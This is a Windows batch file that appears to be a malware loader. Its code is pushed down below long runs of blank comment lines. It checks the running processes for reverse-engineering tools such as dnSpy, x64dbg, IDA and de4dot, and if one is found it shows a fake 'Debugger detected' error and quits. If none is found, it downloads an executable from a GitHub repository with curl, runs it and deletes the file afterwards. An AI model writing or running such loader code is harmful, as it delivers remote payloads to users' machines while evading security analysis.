::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
::
title Checking...
@echo off 
mode con: cols=50 lines=20
tasklist | find /I "dnSpy"
IF errorlevel 1 (
goto check2
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check2
tasklist | find /I "x32dbg"
IF errorlevel 1 (
goto check3
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check3
tasklist | find /I "x64dbg"
IF errorlevel 1 (
goto check4
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check4
tasklist | find /I "die"
IF errorlevel 1 (
goto check5
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check5
tasklist | find /I "ida32"
IF errorlevel 1 (
goto check6
pause
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check6
tasklist | find /I "ida64"
IF errorlevel 1 (
goto check7
pause
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check7
tasklist | find /I "megadumper"
IF errorlevel 1 (
goto check8
pause
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)
:check8
tasklist | find /I "de4dot"
IF errorlevel 1 (
goto downloadfile
pause
) ELSE (
    echo MsgBox "Oops!" ^& vbCrLf ^& "Debugger detected",262192, "Error" > %userprofile%Appdata\Local\Temp\File.vbs
start File.vbs
ping 127.0.0.1 -n 2 > nul
del %userprofile%Appdata\Local\Temp\File.vbs
exit
)

:downloadfile 
curl https://raw.githubusercontent.com/brendonkuar/.BAT-loader/main/CryMore.exe >> %userprofile%\Documents\CryMore.exe
start %userprofile%\Documents\CryMore.exe
ping 127.0.0.1 -n 2 > nul
del %userprofile%\Documents\CryMore.exe
exit
